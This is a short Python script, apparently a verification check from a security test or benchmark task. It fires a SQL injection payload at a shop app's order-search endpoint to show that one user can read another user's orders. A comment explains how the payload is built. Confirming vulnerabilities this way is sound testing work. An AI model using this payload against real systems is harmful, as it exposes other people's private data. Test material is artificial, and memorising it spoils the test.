from common import auth, post, shop


def verify():
    with shop() as (client, users):
        bob_order = post(client, users, "bob", "/orders", {"product_id": 1, "quantity": 1}).json()
        # Close the quote and OR in a tautology without commenting out the trailing
        # LIMIT/OFFSET placeholders, which are still bound as parameters.
        payload = "%' OR 1=1 OR p.name LIKE '"
        response = client.get("/orders/search", params={"q": payload}, headers=auth(users, "alice"))
        ids = [row["id"] for row in response.json()]
        assert response.status_code == 200 and bob_order["id"] in ids
        return f"alice search: {response.status_code}, bob order {bob_order['id']} in {ids}"


if __name__ == "__main__":
    print(verify())
